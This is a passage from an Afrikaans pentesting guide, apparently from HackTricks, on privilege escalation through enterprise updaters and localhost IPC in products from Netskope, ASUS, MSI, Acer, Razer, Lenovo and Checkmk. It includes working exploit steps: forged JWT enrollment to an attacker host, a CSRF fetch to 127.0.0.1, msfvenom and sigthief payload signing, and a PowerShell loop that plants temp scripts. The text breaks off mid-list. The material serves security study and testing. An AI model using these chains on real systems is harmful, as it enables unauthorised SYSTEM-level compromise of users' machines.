# Misbruik van Enterprise Auto-Updaters en Privileged IPC (bv. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy veralgemeen ’n klas Windows-plaaslike privilege-escalation-kettings wat gevind word in enterprise endpoint-agents en updaters wat ’n maklike IPC-koppelvlak en ’n bevoorregte update-vloei blootstel. ’n Verteenwoordigende voorbeeld is Netskope Client vir Windows < R129 (CVE-2025-0309), waar ’n gebruiker met lae voorregte enrollment na ’n aanvaller-beheerde bediener kan dwing en dan ’n kwaadwillige MSI kan aflewer wat die SYSTEM-diens installeer.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Sleutelidees wat jy teen soortgelyke produkte kan hergebruik:
- Misbruik ’n bevoorregte diens se localhost-IPC om her-enrollment of herkonfigurasie na ’n aanvallerbediener af te dwing.
- Implementeer die verskaffer se update-endpoints, lewer ’n rogue Trusted Root CA af en wys die updater na ’n kwaadwillige, “ondertekende” pakket.
- Omseil swak signer-kontroles (CN-toegelaten lyste), opsionele digest-vlae en permissiewe MSI-eienskappe.
- As IPC “geënkripteer” is, lei die sleutel/IV af van masjienidentifiseerders wat wêreldleesbaar in die register gestoor word.
- As die diens oproepers volgens image path/prosesnaam beperk, injecteer in ’n proses op die toegelate lys of begin een suspended en bootstrap jou DLL via ’n minimale thread-context-patch.

Pasgemaakte plaaslike TCP-dienste verdien dieselfde hersiening van identiteit en invoergrense, selfs wanneer hulle ’n PIN of ander toepassingbewys vereis. Bepaal die listener se proses en effektiewe diensrekening, en ondersoek dan die presiese ontplooide binêre/lêerweergawe en of velde wat deur die oproeper beheer word, lengtegekontroleer word voordat dit na vaste buffers gekopieer word of gebruik word om ’n child-process-opdrag saam te stel. [Microsoft se riglyne oor buffer-overruns](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) verduidelik waarom ongekontroleerde eksterne invoer gevaarlik is in bevoorregte native code. ’n Loopback-listener, hardcoded credential of prosesnaam bewys op sigself nie geheuekorrupsie of SYSTEM-uitvoering nie; bereikbaarheid, magtiging, code path en versagtings bly afsonderlike voorwaardes. Hou roetine-enumerasie passief eerder as om invoer met crash-lengte na ’n lewendige diens te stuur.

---
## 1) Dwing enrollment na ’n aanvallerbediener via localhost-IPC

Baie agents sluit ’n user-mode UI-proses in wat via localhost TCP met ’n SYSTEM-diens kommunikeer deur JSON te gebruik.

Waargeneem in Netskope:
- UI: stAgentUI (low integrity) ↔ Diens: stAgentSvc (SYSTEM)
- IPC-opdrag-ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit-vloei:
1) Stel ’n JWT-enrollment-token saam waarvan die claims die backend-host beheer (bv. AddonUrl). Gebruik alg=None sodat ’n signature nie vereis word nie.
2) Stuur die IPC-boodskap wat die provisioning-opdrag met jou JWT en tenant-naam aanroep:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Die diens begin jou rogue server vir registrasie/konfigurasie kontak, bv.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- As bellerverifikasie op die pad/naam gebaseer is, laat die versoek van ’n toegelate verskaffer-binêre afkomstig wees (sien §4).<sup>[[1]](#references)[[2]](#references)</sup>

### Bestuurs-IPC wat aan die netwerk blootgestel is

Hierdie vertrouensgrens is nie altyd tot localhost beperk nie. In die gerapporteerde MyReport Updater 2.1.1-geval het ’n `LocalSystem`-diens op alle koppelvlakke geluister en ’n ongeverifieerde gRPC-konfigurasieverandering vir die verwysingsgasheer, poort en bedryfsmodus aanvaar. Vir die afgeleë variant was beide netwerktoegang tot die luisteraar en uitgaande toegang vanaf die diens na die gekose verwysing nodig. Beoordeel dit afsonderlik van die vraag of die daaropvolgende pakketvloei die lêerskryfgrens kan oorsteek.<sup>[[16]](#references)</sup>

---
## 2) Kaap die opdateringskanaal om kode as SYSTEM uit te voer

Sodra die kliënt met jou bediener kommunikeer, implementeer die verwagte eindpunte en stuur dit na ’n aanvaller-MSI. Tipiese volgorde:

1) /v2/config/org/clientconfig → Gee JSON-konfigurasie terug met ’n baie kort opdateringsinterval, bv.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Gee 'n PEM CA-sertifikaat terug. Die diens installeer dit in die Local Machine Trusted Root-winkel.
3) /v2/checkupdate → Verskaf metadata wat na 'n kwaadwillige MSI en 'n vals weergawe wys.

Omseiling van algemene kontroles wat in die praktyk voorkom:
- Signer CN allow-list: die diens kontroleer dalk net of die Subject CN gelyk is aan “netSkope Inc” of “Netskope, Inc.”. Jou rogue CA kan 'n leaf met daardie CN uitreik en die MSI onderteken.
- CERT_DIGEST-eienskap: sluit 'n onskadelike MSI-eienskap genaamd CERT_DIGEST in. Geen afdwinging tydens installasie nie.
- Opsionele digest-afdwinging: 'n config-vlag (bv. check_msi_digest=false) deaktiveer ekstra kriptografiese validering.

Gevolg: die SYSTEM-diens installeer jou MSI vanaf
C:\ProgramData\Netskope\stAgent\data\*.msi
en voer arbitrêre kode uit as NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Les oor patch-omseiling: as 'n verskaffer reageer deur 'n klein stel “vertroude” domeine toe te laat in plaas daarvan om die opdateringsbron kriptografies te verifieer, soek na aanstuurdienste of reverse proxies wat steeds toelaat dat jy verkeer stuur. In Netskope se geval het openbare opvolgnavorsing getoon dat 'n allow-list uit die R129-era steeds misbruik kon word deur `rproxy.goskope.com`, wat inhoud van 'n aanvaller-beheerde Azure App Service geproxy het. Beskou hostname allow-lists as 'n spoedhobbel, nie as 'n trust boundary nie.<sup>[[14]](#references)</sup>

'n Ander foutmodus is **selfkonsekwente, maar nie-geauthentiseerde pakketmetadata**. In die MyReport-geval het 'n aanvaller-beheerde verwysing 'n gewysigde argief bedien, terwyl 'n tussenpersoon die verskaffer se MD5-digest- en grootteantwoorde verander het voordat dit die updater bereik het. Deur daardie waardes te laat ooreenstem, is die konsekwentheid van die antwoorde nagegaan, nie die oorsprong van die verskaffer nie; 'n MD5-botsing was nie nodig nie. 'n Installasiegids wat deur die aanroeper gekies is, het die bevoorregte ekstraksie toe 'n lêerskryfgrens gemaak. Die gevolglike DLL-laaiprimitive word bespreek onder [om 'n arbitrêre lêerskryf in DLL-hijacking te omskep](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Vervalsing van geënkripteerde IPC-versoeke (waar dit voorkom)

Vanaf R127 het Netskope IPC JSON in 'n encryptData-veld verpak wat soos Base64 lyk. Omgekeerde ontleding het AES aan die lig gebring, met die sleutel/IV afgelei van registerwaardes wat deur enige gebruiker gelees kan word:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Aanvallers kan die enkripsie reproduseer en geldige geënkripteerde opdragte vanaf 'n standaardgebruiker stuur.<sup>[[1]](#references)[[2]](#references)</sup> Algemene wenk: as 'n agent skielik sy IPC “enkripteer”, soek na toestel-ID's, produk-GUID's en installasie-ID's onder HKLM wat as materiaal gebruik word.

---
## 4) Omseiling van IPC-oproeper-allow-lists (pad-/naamkontroles)

Sommige dienste probeer die eweknie verifieer deur die PID van die TCP-verbinding op te soek en die beeldpad/-naam te vergelyk met allow-listed vendor-binaries in Program Files (bv. stagentui.exe, bwansvc.exe, epdlp.exe).

Twee praktiese omseilings:
- DLL-inspuiting in 'n allow-listed proses (bv. nsdiag.exe) en die proxy van IPC van binne daardie proses.
- Begin 'n allow-listed binary in opgeskorte toestand en laai jou proxy-DLL op sonder CreateRemoteThread (sien §5) om aan bestuurder-afgedwonge peuterreëls te voldoen.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Peuterbeskermingsvriendelike inspuiting: opgeskorte proses + NtContinue-patch

Produkte sluit dikwels 'n minifilter-/OB-callbacks-bestuurder (bv. Stadrv) in om gevaarlike regte uit handvatsels na beskermde prosesse te verwyder:
- Proses: verwyder PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beperk tot THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

'n Betroubare user-mode loader wat hierdie beperkings respekteer:
1) Skep 'n proses met 'n vendor-binary en CREATE_SUSPENDED.
2) Verkry die handvatsels wat steeds toegelaat word: PROCESS_VM_WRITE | PROCESS_VM_OPERATION vir die proses, en 'n thread-handvatsel met THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (of net THREAD_RESUME as jy kode by 'n bekende RIP patch).
3) Oorskryf ntdll!NtContinue (of 'n ander vroeë, gewaarborg-gelaaide thunk) met 'n klein stub wat LoadLibraryW op jou DLL-pad aanroep en dan terugspring.
4) ResumeThread om jou stub binne die proses te aktiveer en jou DLL te laai.

Omdat jy nooit PROCESS_CREATE_THREAD of PROCESS_SUSPEND_RESUME op 'n proses gebruik het wat reeds beskerm was nie (jy het dit geskep), voldoen dit aan die bestuurder se beleid.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktiese gereedskap
- NachoVPN (Netskope-plugin) outomatiseer 'n rogue CA, die ondertekening van 'n kwaadwillige MSI en die bediening van die nodige endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope is 'n pasgemaakte IPC-kliënt wat arbitrêre (opsioneel AES-geënkripteerde) IPC-boodskappe saamstel en die inspuiting van 'n opgeskorte proses insluit om vanuit 'n allow-listed binary te kommunikeer.<sup>[[4]](#references)</sup>

## 7) Vinnige triage-werkvloei vir onbekende updater-/IPC-oppervlakke

Wanneer jy met 'n nuwe endpoint-agent of 'n moederbord-“helper”-suite te doen kry, is 'n vinnige werkvloei gewoonlik genoeg om vas te stel of jy na 'n belowende privesc-teiken kyk:<sup>[[6]](#references)</sup>

1) Lys loopback-listeners op en koppel hulle aan vendor-prosesse:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Lys moontlike named pipes:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Ontgin registerdata wat gebruik word vir roetering deur inpropgebaseerde IPC-bedieners:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Onttrek eers endpoint-name, JSON-sleutels en command-ID's uit die user-mode-kliënt. Verpakte Electron/.NET-frontends leak dikwels die volledige skema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Soek die werklike vertrouenspredikaat, nie net die kodepad wat uiteindelik die proses begin nie:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Patrone wat voorkeur behoort te geniet:
- `CryptQueryObject`/sertifikaatontleding sonder `WinVerifyTrust` beteken gewoonlik dat “sertifikaat bestaan” as “sertifikaat is vertrou” beskou is, wat sertifikaatkloning of ander vals-ondertekenaar-truuks moontlik maak.
- Substring-/agtervoegselkontroles op `Origin`, `Referer`, aflaai-URL's, prosesname of ondertekenaar-CN's is nie verifikasie nie. `contains(".vendor.com")` is gewoonlik uitbuitbaar met aanvallergestuurde domeine wat egte domeine naboots.
- As die GUI met lae voorregte besluit “die lêer is vertrou” en die SYSTEM-broker bloot daardie resultaat gebruik, kan die grens heeltemal omseil word deur die kliëntkant-DLL/JS te patch of te herimplementeer (Razer-styl gesplete validering).
- As die broker 'n payload na `%TEMP%`/`C:\Windows\Temp` kopieer en dit dan vanaf daardie pad valideer of skeduleer, toets dadelik vir TOCTOU-vervangingsvensters en vir bykomende plugin-modules wat alternatiewe `ExecuteTask()`-omhulsels met swakker kontroles blootstel.<sup>[[6]](#references)</sup>

Vir teikens wat swaar op benoemde pype steun, is PipeViewer 'n vinnige manier om swak DACL's en pype wat op afstand bereikbaar is, raak te sien voordat jy die protokol in diepte begin omkeer-ontleed.<sup>[[11]](#references)</sup>

As die teiken oproepers slegs volgens PID, beeldpad of prosesnaam verifieer, beskou dit as 'n hindernis eerder as 'n grens: inspuiting in die wettige kliënt, of die verbinding vanaf 'n proses op die toelaatlys, is dikwels genoeg om aan die bediener se kontroles te voldoen. Vir benoemde pype spesifiek, behandel [hierdie bladsy oor kliëntnabootsing en pypmisbruik](named-pipe-client-impersonation.md) die primitief in meer diepte.

Vir 'n bevoorregte **opruim- of herstelbroker**, ondersoek die padvertrouensgrens sowel as die pyp-ACL. 'n Oproeper met laer voorregte kan dalk 'n herstelbestemming kies of 'n opgevoerde rugsteunartefak in 'n gedeelde gids hernoem, selfs wanneer die diensuitvoerbare lêer en sy installasiegids beskerm is. Bevestig afsonderlik dat die oproeper toegang tot die herstelopdrag het, die presiese opgevoerde invoer of lêernaam kan wysig, die broker onder 'n hoër identiteit loop, en die herstelbewerking werklik na die gekose beskermde pad skryf. 'n Skryfbare opvoer-gids of 'n leesbare pyp bewys op sigself nie dat arbitrêre bevoorregte skryfwerk moontlik is nie; die bestemmingskartering en diensgedrag moet deur kodehersiening of beheerde toetsing nagegaan word. Moenie 'n onbekende opruimopdrag tydens passiewe verkenning uitvoer nie, want dit kan gebruikerslêers uitvee.

---
## 8) Modulêre byvoegingsbrokers wat slegs deur verskafferhandtekeninge geverifieer word (Lenovo Vantage-patroon)

'n Nuwer variasie wat die moeite werd is om na te soek, is die **RPC-broker met ondertekende kliënt**: 'n Lenovo-ondertekende lessenaarproses met lae voorregte kommunikeer met 'n SYSTEM-diens, en die diens stuur JSON-opdragte na 'n stel XML-beskrewe byvoegings onder `%ProgramData%`. Sodra kode-uitvoering **binne enige aanvaarde ondertekende kliënt** verkry is, word elke `runas="system"`-kontrak deel van jou aanvalsoppervlak.<sup>[[15]](#references)</sup>

Primitiewe met hoë waarde wat in Lenovo Vantage-navorsing waargeneem is:
- **Om die oproeper te vertrou omdat dit deur die verskaffer onderteken is**: navorsers het 'n geverifieerde konteks bereik deur 'n Lenovo-ondertekende EXE na 'n skryfbare gids te kopieer en 'n DLL-sylaai (`profapi.dll`) te bewerkstellig, sodat arbitrêre kode binne 'n kliënt waarop die diens reeds vertrou het, uitgevoer is.
- **Ontdekking van die aanvalsoppervlak wat deur manifeste bepaal word**: byvoegings word verklaar onder `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; verskeie kontrakte loop as `SYSTEM`, dus openbaar die opnoem van daardie manifeste dikwels die werklike bevoorregte handelinge vinniger as om die broker self om te keer-ontleed.
- **Foute per opdrag agter die geverifieerde kanaal**: sodra hulle binne die vertroude kliënt was, het openbare navorsing paddeurkruising plus rasertoestande in opdaterings-/installasiehandelinge, misbruik van rou SQL in bevoorregte instellingsdatabasisse en substring-gebaseerde registerpadkontroles gevind wat skryfwerk buite die bedoelde hive moontlik gemaak het.

Nuttige verkenning op 'n teiken:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktiese gevolgtrekking: wanneer ’n helper suite ’n broker blootstel wat eers die **caller process** verifieer en daarna dosyne plugin/add-in-opdragte uitvoer, moenie ophou nadat jy die front-door trust check omseil het nie. Dump die manifest/contract table en fuzz elke high-privilege-werkwoord afsonderlik; die geverifieerde kanaal verberg gewoonlik verskeie second-stage-foute.

---
## 1) Browser-na-localhost-CSRF teen bevoorregte HTTP-API’s (ASUS DriverHub)

DriverHub lewer ’n user-mode HTTP-diens (ADU.exe) op 127.0.0.1:53000 wat verwag dat browser-oproepe van https://driverhub.asus.com af kom. Die oorsprongfilter voer bloot `string_contains(".asus.com")` uit op die Origin-header en op download-URL’s wat deur `/asus/v1.0/*` blootgestel word. Enige aanvallerbeheerde host soos `https://driverhub.asus.com.attacker.tld` slaag dus die kontrole en kan toestandveranderende versoeke vanaf JavaScript uitstuur.<sup>[[6]](#references)</sup> Sien [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) vir bykomende omseilingspatrone.

Praktiese vloei:
1) Registreer ’n domein wat `.asus.com` bevat en huisves ’n kwaadwillige webblad daarop.
2) Gebruik `fetch` of XHR om ’n bevoorregte endpoint (bv. `Reboot`, `UpdateApp`) op `http://127.0.0.1:53000` aan te roep.
3) Stuur die JSON-body wat die handler verwag – die saamgeperste frontend-JS wys die skema hieronder.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Selfs die PowerShell CLI wat hieronder gewys word, slaag wanneer die Origin-header na die vertroude waarde gespoof word:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Enige besoek met ’n blaaier aan die aanvaller se webwerf word dus ’n plaaslike CSRF met 1 klik (of 0 klikke via `onload`) wat ’n SYSTEM-helper aandryf.

---
## 2) Onveilige code-signing-verifikasie en sertifikaatkloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` laai arbitrêre uitvoerbare lêers af wat in die JSON-liggaam gedefinieer word en kas hulle in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. URL-validering vir aflaaie hergebruik dieselfde substring-logika, dus word `http://updates.asus.com.attacker.tld:8000/payload.exe` aanvaar. Ná die aflaai kyk ADU.exe bloot of die PE ’n handtekening bevat en of die Subject-string met ASUS ooreenstem voordat dit die lêer laat loop – geen `WinVerifyTrust` of kettingvalidering nie.

Om die vloei as wapen te gebruik:
1) Skep ’n payload (bv. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Kloon ASUS se ondertekenaar daarin (bv. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Bedien `pwn.exe` op ’n `.asus.com`-nabootsingsdomein en aktiveer UpdateApp via die blaaier-CSRF hierbo.

Omdat beide die Origin- en URL-filters op substring-basis werk en die ondertekenaarkontrole slegs stringe vergelyk, laai DriverHub die aanvaller se binêre lêer af en voer dit in sy verhoogde konteks uit.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU in updater se kopieer-/uitvoer-paaie (MSI Center CMD_AutoUpdateSDK)

MSI Center se SYSTEM-diens stel ’n TCP-protokol beskikbaar waar elke raam `4-byte ComponentID || 8-byte CommandID || ASCII arguments` is. Die kernkomponent (Component ID `0f 27 00 00`) bevat `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Die hanteerder:
1) Kopieer die verskafde uitvoerbare lêer na `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifieer die handtekening via `CS_CommonAPI.EX_CA::Verify` (die sertifikaat se Subject moet gelyk wees aan “MICRO-STAR INTERNATIONAL CO., LTD.” en `WinVerifyTrust` moet slaag).
3) Skep ’n geskeduleerde taak wat die tydelike lêer as SYSTEM met aanvallerbeheerde argumente laat loop.

Die gekopieerde lêer word nie tussen verifikasie en `ExecuteTask()` gesluit nie. ’n Aanvaller kan:
- Raam A stuur wat na ’n wettige MSI-ondertekende binêre lêer verwys (verseker dat die handtekeningkontrole slaag en die taak in die tou geplaas word).
- Dit met herhaalde Raam B-boodskappe wedren, wat na ’n kwaadwillige payload verwys en `MSI Center SDK.exe` net ná die voltooiing van verifikasie oorskryf.

Wanneer die skeduleerder die taak uitvoer, laat dit die oorskryfde payload as SYSTEM loop, hoewel die oorspronklike lêer gevalideer is. Betroubare uitbuiting gebruik twee goroutines/drade wat `CMD_AutoUpdateSDK` oor en oor stuur totdat die TOCTOU-venster gewen word.<sup>[[6]](#references)</sup>

---
## 2) Misbruik van pasgemaakte SYSTEM-vlak IPC en impersonasie (MSI Center + Acer Control Centre)

### MSI Center TCP-opdragstelle
- Elke plugin/DLL wat deur `MSI.CentralServer.exe` gelaai word, ontvang ’n Component ID wat onder `HKLM\SOFTWARE\MSI\MSI_CentralServer` gestoor word. Die eerste 4 grepe van ’n raam kies daardie komponent, sodat aanvallers opdragte na arbitrêre modules kan stuur.
- Plugins kan hul eie taaklopers definieer. `Support\API_Support.dll` stel `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` beskikbaar en roep `API_Support.EX_Task::ExecuteTask()` direk aan, **sonder handtekeningvalidering** – enige plaaslike gebruiker kan dit na `C:\Users\<user>\Desktop\payload.exe` laat wys en deterministiese SYSTEM-uitvoering kry.
- Deur loopback met Wireshark af te luister of die .NET-binêre lêers in dnSpy te instrumenteer, word die Component ↔-opdragkartering vinnig onthul; pasgemaakte Go-/Python-kliënte kan dan rame herhaal.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes en impersonasievlakke
- `ACCSvc.exe` (SYSTEM) stel `\\.\pipe\treadstone_service_LightMode` beskikbaar, en sy discretionary ACL laat afgeleë kliënte toe (bv. `\\TARGET\pipe\treadstone_service_LightMode`). Deur opdrag-ID `7` met ’n lêerpad te stuur, word die diens se prosesbeginroetine aangeroep.
- Die kliëntbiblioteek serialiseer ’n magiese terminator-greep (113) saam met argumente. Dinamiese instrumentering met Frida/`TsDotNetLib` (sien [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) vir instrumenteringswenke) wys dat die native hanteerder hierdie waarde na ’n `SECURITY_IMPERSONATION_LEVEL` en integriteit-SID karteer voordat dit `CreateProcessAsUser` aanroep.
- Deur 113 (`0x71`) met 114 (`0x72`) te vervang, beland die uitvoering in die generiese tak wat die volledige SYSTEM-token behou en ’n hoë-integriteit-SID (`S-1-16-12288`) instel. Die geskepte binêre lêer loop dus as onbeperkte SYSTEM, plaaslik én oor masjiene heen.
- Kombineer dit met die blootgestelde installer-vlag (`Setup.exe -nocheck`) om ACC selfs op lab-VM’s te installeer en die pipe sonder hardeware van die verskaffer te toets.<sup>[[6]](#references)</sup>

Hierdie IPC-foute beklemtoon waarom localhost-dienste wedersydse verifikasie moet afdwing (ALPC-SID’s, `ImpersonationLevel=Impersonation`-filters, tokenfiltrering), en waarom elke module se “arbitrêre binêre lêer laat loop”-helper dieselfde ondertekenaarverifikasies moet gebruik.

---
## 3) COM/IPC-“elevator”-helpers wat op swak gebruikersmodusvalidering staatmaak (Razer Synapse 4)

Razer Synapse 4 het nog ’n nuttige patroon by hierdie familie gevoeg: ’n gebruiker met lae voorregte kan ’n COM-helper vra om ’n proses deur `RzUtility.Elevator` te begin, terwyl die vertrouensbesluit aan ’n gebruikersmodus-DLL (`simple_service.dll`) oorgelaat word eerder as om dit sterk binne die bevoorregte grens af te dwing.

Waargenome uitbuitingspad:
- Instansieer die COM-objek `RzUtility.Elevator`.
- Roep `LaunchProcessNoWait(<path>, "", 1)` aan om ’n verhoogde begin aan te vra.
- In die openbare PoC word die PE-handtekeninghek binne `simple_service.dll` reggemaak voordat die versoek gestuur word, sodat ’n arbitrêre, deur die aanvaller gekose uitvoerbare lêer begin kan word.<sup>[[6]](#references)[[10]](#references)</sup>

Minimale PowerShell-aanroep:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Algemene gevolgtrekking: wanneer jy “helper”-suites reverse engineer, moenie by localhost TCP of named pipes ophou nie. Kyk vir COM-klasse met name soos `Elevator`, `Launcher`, `Updater` of `Utility`, en verifieer dan of die bevoorregte diens die teikenbinêre lêer self valideer, of bloot ’n resultaat vertrou wat deur ’n aanpasbare user-mode-kliënt-DLL bereken is. Hierdie patroon strek verder as Razer: enige ontwerp wat take verdeel waar die hoëbevoorregte broker ’n allow/deny-besluit van die laebevoorregte kant aanvaar, is ’n moontlike privesc-aanvalsoppervlak.


---
## Voorspelbare tydelike skripuitvoering tydens MSI-herstel (Checkmk Agent / CVE-2024-0670)

Sommige Windows-agente voer steeds bevoorregte aksies uit deur ’n tydelike `.cmd` in `C:\Windows\Temp` te skryf en dit as `SYSTEM` uit te voer. As die lêernaam voorspelbaar is en die diens nie bestaande lêers veilig herskep nie, kan ’n gebruiker met lae voorregte die toekomstige tydelike lêer vooraf as **read-only** skep en veroorsaak dat die bevoorregte proses inhoud uitvoer wat deur die aanvaller beheer word, eerder as sy eie skrip.

Waargeneem in kwesbare Checkmk Agent-bouweergawes:
- tydelike patroon: `cmk_all_<PID>_1.cmd`
- geraakte weergawetakke: `2.0.0`, `2.1.0`, `2.2.0`
- sneller: MSI-**herstel** van die agentpakket in die kas<sup>[[8]](#references)[[9]](#references)</sup>

Praktiese werksvloei:
1. Skat ’n realistiese PID-reeks op grond van huidige proses-ID’s of die lopende agent se PID.
2. Skryf ’n kort `.cmd`-looglêer in **ASCII** (`Set-Content -Encoding Ascii` of `cmd.exe`-herleiding; vermy PowerShell-uitvoer in UTF-16 vir batch-lêers).
3. Skep `C:\Windows\Temp\cmk_all_<PID>_1.cmd` oor die kandidaat-reeks en merk elke lêer as read-only.
4. Aktiveer ’n herstel van die MSI in die kas sodat die bevoorregte diens probeer om die tydelike skrip te herskep en dit dan uit te voer.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

As die kwesbare produk met Windows Installer geïnstalleer is, koppel die ewekansig lykende kas-MSI onder `C:\Windows\Installer` aan sy produknaam voordat jy die herstel aktiveer:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operasionele notas:
- `qwinsta` is nuttig wanneer `msiexec /fa` vanuit ’n nie-interaktiewe WinRM-shell misluk en jy moet vasstel of ’n bestaande rekenaar-/ontkoppelde sessie die herstelwerk korrek kan aktiveer.<sup>[[7]](#references)</sup>
- Hierdie patroon geld ook vir ander endpoint-agente en updaters wat **temp-skripte op plekke skryfbaar vir almal plaas en dit later as SYSTEM uitvoer**. Toets vir voorspelbare name, ontbrekende eksklusiewe-skeppingsemantiek en herstel-/opdateringsvloeie wat op aanvraag geaktiveer kan word.

### Herstel van interaktiewe installeerder en bevoorregte konsole

PDF24 Creator 11.15.1 illustreer ’n afsonderlike MSI-herstelrisiko: die drukkerinstallasie se custom action kan tydens herstel ’n sigbare konsole met SYSTEM-regte begin. Die verskaffer het die MSI-installeerder in 11.15.2 aangepas om hierdie gedrag aan te spreek. ’n Ouer produkweergawe is slegs ’n triage-leidraad. Gaan die geregistreerde of bereikbare MSI-pakket na, of hierdie gebruiker herstelwerk kan begin, of die kwesbare custom action en die vertraging in die loglêer teenwoordig is, en of ’n interaktiewe rekenaaromgewing die konsole sigbaar kan maak. Die gerapporteerde vertraging het ’n oplock op `faxPrnInst.log` gebruik; gewone skryfbaarheid van die lêer is nie die enigste toegangsvoorwaarde nie. ’n Nie-interaktiewe shell, ontoeganklike pakket of reggestelde installeerder kan die ketting verbreek. Hierdie probleem is nie afhanklik van `AlwaysInstallElevated` nie en verskil van die vervanging van ’n voorspelbare tydelike skrip.

---
## Afgeleë voorsieningskettingkaping via swak updater-validering (WinGUp / Notepad++)

Tussen Junie 2025 en Desember 2025 het aanvallers wat die gasheerinfrastruktuur agter die Notepad++-opdateringsvloei gekompromitteer het, kwaadwillige manifeste selektief aan uitgesoekte slagoffers bedien. Ouer WinGUp-gebaseerde updaters het nie die egtheid van opdaterings volledig geverifieer nie, dus kon ’n kwaadwillige XML-antwoord kliënte na aanvallersbeheerde URL’s herlei. Omdat die kliënt HTTPS-inhoud aanvaar het sonder om sowel ’n vertroude sertifikaatketting as ’n geldige PE-handtekening op die afgelaaide installeerder af te dwing, het slagoffers ’n getrojaniseerde NSIS-`update.exe` afgelaai en uitgevoer.<sup>[[12]](#references)[[13]](#references)</sup>

Operasionele vloei (geen plaaslike exploit nodig nie):
1. **Infrastruktuuronderskepping**: kompromitteer die CDN/gasheeromgewing en beantwoord opdateringsnavrae met aanvallermetadata wat na ’n kwaadwillige aflaai-URL wys.
2. **Getrojaniseerde NSIS**: die installeerder haal ’n payload af en voer dit uit, en misbruik twee uitvoeringskettings:
